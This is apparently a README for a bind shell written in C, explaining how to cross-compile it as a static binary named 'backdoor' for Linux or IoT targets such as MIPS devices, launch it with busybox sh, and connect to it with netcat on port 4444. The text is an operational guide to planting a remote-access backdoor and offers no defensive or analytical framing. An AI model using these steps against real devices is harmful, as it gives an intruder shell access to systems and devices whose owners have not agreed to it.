# Overview
A bind shell written in C.
Compile it for the architecture of your Linux target, set it up and connect with netcat from your device.

For example, to compile it for mips 32 EL
```bash
mipsel-linux-gnu-gcc bind_shell.c -o backdoor --static
```

# Usage
```bash
./backdoor <path_to_shell> <shell>
```

For example on an IoT target
```bash
./backdoor /bin/busybox sh
```

And we can finally connect to it via netcat from our device
```bash
nc <target_ip> 4444
```
